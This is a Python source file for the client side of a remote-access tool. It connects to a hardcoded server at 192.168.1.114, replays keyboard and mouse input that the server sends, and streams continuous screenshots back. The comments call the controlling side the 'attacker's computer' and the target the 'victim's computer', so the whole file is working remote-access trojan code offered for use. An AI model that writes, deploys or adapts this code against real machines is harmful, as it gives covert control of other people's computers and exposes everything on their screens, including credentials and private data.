import time
import socket
import pyautogui
import threading
from io import BytesIO
from PIL import ImageGrab
from pynput.keyboard import Controller as KeyboardController, Key
from pynput.mouse import Button 
from pynput.mouse import Controller as MouseController



def create_client(ip, port):
    # Creates a socket object for the client
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create TCP Socket object
    client_socket.connect((ip, port)) # Define the IP + Port for the server
    print(f"[+] Connected to server {ip}:{port}")
    return client_socket



def handling_keyboard(client_keyboard_socket):
    '''
    A function that manages receiving the key from the server, checking whether it is a special key or a regular character
    (there is a specific reference to the caps_lock key so that it works as if a person physically pressed it on the remote computer).
    '''

    remote_keyboard = KeyboardController()
    caps_lock_on = False

    # A dictionary that contains most if not all of the special keys on the keyboard - the key is their name and the value is the action used to "press the key"
    special_keys = {"ctrl": Key.ctrl, "ctrl_r": Key.ctrl_r, "ctrl_l": Key.ctrl_l, "shift": Key.shift, "shift_r": Key.shift_r, "alt": Key.alt,
                    "alt_gr": Key.alt_gr, "alt_l": Key.alt_l, "alt_r": Key.alt_r, "media_next": Key.media_next, "menu": Key.menu, "tab": Key.tab, 
                    "media_play_pause": Key.media_play_pause, "media_previous": Key.media_previous, "media_volume_down": Key.media_volume_down,
                    "media_volume_mute": Key.media_volume_mute, "media_volume_up": Key.media_volume_up, "caps_lock": Key.caps_lock,
                    "enter": Key.enter, "esc": Key.esc, "backspace": Key.backspace, "space": Key.space, "left": Key.left, "right": Key.right,
                    "up": Key.up, "down": Key.down, "cmd": Key.cmd, "cmd_l": Key.cmd_l, "cmd_r": Key.cmd_r, "home": Key.home, "f1": Key.f1,
                    "f2": Key.f2, "f3": Key.f3, "f4": Key.f4, "f5": Key.f5, "f6": Key.f6, "f7": Key.f7, "f8": Key.f8, "f9": Key.f9, "f10": Key.f10,
                    "f11": Key.f11, "f12": Key.f12, "page_up": Key.page_up, "print_screen": Key.print_screen, "page_down": Key.page_down,
                    "end": Key.end, "pause": Key.pause, "scroll_lock": Key.scroll_lock, "delete": Key.delete, "insert": Key.insert,
                    "num_lock": Key.num_lock}
    
    while True:
        key_str = client_keyboard_socket.recv(1024).decode('utf-8')
        # If nothing was received
        if not key_str:
            continue
    
        try:
            # Dividing the packet received from the server into the action (press or release) and the key name (as in the dictionary written above)
            action, key_name = key_str.strip().split(',')
            # Finding the key action if it is a special key by the name in the dictionary, otherwise the name of the resulting key is the value of the change
            key = special_keys.get(key_name, key_name)

            # If the action is press
            if action == "press":
                # Handling the caps_lock key if pressed
                if key == Key.caps_lock and not caps_lock_on:
                    caps_lock_on = True

                elif key == Key.caps_lock and caps_lock_on:
                    caps_lock_on = False

                remote_keyboard.press(key)

            # If the action is release
            elif action == "release":
                # Handling the caps_lock key if released
                if key == Key.caps_lock and not caps_lock_on:
                    continue

                remote_keyboard.release(key)

        except Exception as e:
            print(f"Error handling key {key_str}: {e}")

        time.sleep(0.03)



def handling_mouse(client_mouse_socket):
    '''
    A function that receives an action performed with the mouse on the attacking computer from the server and
    executes it on the attacked computer (it contains other functions that help separate the different actions
    that can be performed with the mouse).
    '''

    remote_mouse = MouseController()

    def on_move(x, y):
        # In case of mouse movement on the attacker's computer
        remote_mouse.position = (x, y)


    def on_click(button, pressed):
        # In case of mouse click on the attacker's computer(press or release)
        if pressed:
            remote_mouse.press(Button.left if button == "left" else Button.right)
        else:
            remote_mouse.release(Button.left if button == "left" else Button.right)


    def on_scroll(dx, dy):
        # In the case of scrolling with the mouse on the attacker's computer
        remote_mouse.scroll(dx, dy)
    
    '''
    Creating a "file" that will receive packets from the server when there is a mouse-related action (the reception of packets is
    done specifically during mouse actions so that packets that are sent quickly one after the other do not destroy the data of other
    packets that come before them)
    '''
    mouse_file = client_mouse_socket.makefile('r')

    while True:
        # Reading the packet as a line in the "file"
        mouse_info = mouse_file.readline().strip()
        print("Received raw data:", mouse_info)
        
        # If nothing was received
        if not mouse_info:
            continue

        # Dividing the packet into a list where the first element specifies the type of action and the elements after it specify data accordingly
        moving_info_list = mouse_info.split(',')

        # If the action is mouse movement
        if moving_info_list[0] == "move":
            x = int(moving_info_list[1]) * (screen_width / 1600) # Adjusting mouse movement to scale with the size of computer screens
            y = int(moving_info_list[2]) * (screen_height / 900) # Adjusting mouse movement to scale with the size of computer screens
            on_move(x, y)

        # If the action is a mouse press or release
        elif moving_info_list[0] == "click":
            button = moving_info_list[1]
            pressed = bool(int(moving_info_list[2]))
            on_click(button, pressed)
        
        # If the action is scrolling with the mouse
        elif moving_info_list[0] == "scroll":
            dx = int(moving_info_list[1]) * (screen_width / 1600) # Adjusting the screen scrolling to scale with the size of computer screens
            dy = int(moving_info_list[2]) * (screen_height / 900) # Adjusting the screen scrolling to scale with the size of computer screens
            on_scroll(dx, dy)

        time.sleep(0.03)



def handling_screen(client_screen_socket):
   '''
   A function that manages screenshots and sends them to the server.
   '''
   while True:
        # Taking a screenshot
        remote_screen = ImageGrab.grab() 

        # Creating a BytesIO() that operates on  buffer in the program's memory
        buffer = BytesIO()

        # Saving the image object to a JPEG image on a buffer in the program's memory
        remote_screen.save(buffer, format = 'JPEG')

        image_bytes = buffer.getvalue() # To get all bytes from the buffer

        try:
            client_screen_socket.sendall(image_bytes)

        except Exception as e:
            print(f"Error sending screen data: {e}")

        time.sleep(0.08)


# Finding the client's screen sizes to match the server's screen size to the mouse movements
screen_width, screen_height = pyautogui.size()

# Creating client sockets that will connect to the server:

# Creating a client socket to perform keyboard operations
c_keyboard_socket = create_client('192.168.1.114', 55001)
# Creating a thread to receive keystrokes pressed on the attacker's computer and execute them on the remote computer (on which the client code is running)
k_thread = threading.Thread(target = handling_keyboard, args = (c_keyboard_socket,))
k_thread.start()

# Creating a client socket to perform mouse operations
c_mouse_socket = create_client('192.168.1.114', 55002)
# Creating a thread to receive actions performed with the mouse on the attacker's computer and execute them on the remote computer (on which the client code is running)
m_thread = threading.Thread(target = handling_mouse, args = (c_mouse_socket,))
m_thread.start()

# Creating a client socket that will capture the victim's computer screen and send the images to the server
c_screen_socket = create_client('192.168.1.114', 55003)
# Creating a thread that manages the process of taking screenshots non-stop (except for the time.sleep time so that the code does not crash)
s_thread = threading.Thread(target = handling_screen, args = (c_screen_socket,))
s_thread.start()


# to synchronize the execution of the threads
k_thread.join()
m_thread.join()
s_thread.join()